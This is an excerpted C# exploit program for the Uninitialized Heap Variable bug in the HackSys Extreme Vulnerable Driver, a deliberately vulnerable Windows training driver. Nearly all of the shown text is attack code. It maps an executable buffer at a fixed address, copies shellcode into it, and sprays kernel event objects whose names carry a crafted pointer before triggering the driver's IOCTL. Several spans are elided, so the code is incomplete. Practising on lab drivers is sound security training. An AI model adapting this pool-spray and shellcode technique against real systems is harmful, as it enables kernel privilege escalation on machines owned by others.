...
namespace UninitializedHeapVariable
{
    class Program
    {
        ...
        static void CleanUp()
        {
            ...
            if (hDevice != IntPtr.Zero)
            {
                ...
                {
                    Console.WriteLine("[!] Failed to close kernel driver's handle (code={0})", Marshal.GetLastWin32Error());
                }
            }
        }
        ...
        {
            byte[] seed = Encoding.ASCII.GetBytes("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
            Random rand = new Random();
            byte[] randomBytes = new byte[length];

            for (int i = 0; i < length; i++)
            {
                randomBytes[i] = seed[rand.Next(seed.Length)];
            }
        ...
        static void Main()
        {
            ...
            Console.WriteLine("--[ HEVD Exploitation : Uninitialized Heap Variable\n");
            ...
            ShellcodeBuffer = VirtualAlloc(new IntPtr(0x40400140), dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            ...
            int offset = 0x40400140 - ShellcodeBuffer.ToInt32();
            Marshal.Copy(shellcode, 0, new IntPtr(ShellcodeBuffer.ToInt32() + offset), shellcode.Length);
            ...
            // Step 3: Event object spray and trigger vulnerability
            uint ioctl = 0x222033;
            byte[] payload = BitConverter.GetBytes(0xdeadbeef);
            int BytesReturned = 0;
            int num = 256;
            IntPtr[] hEvents = new IntPtr[num];
            string eventName;
            int counter = 0;

            Console.WriteLine("[>] Performing event object spraying and triggering vulnerability");

            for (int i = 0; i < num; i++)
            {
                eventName = string.Concat("EVIL\x40\x01\x40\x40", GetRandomString(0xf0 - 8));
                hEvents[i] = CreateEventW(IntPtr.Zero, false, false, eventName);
                if (hEvents[i] != IntPtr.Zero)
                {
                    counter++;
                }
            }

            Console.WriteLine("[+] {0} event objects are created", counter);
            counter = 0;
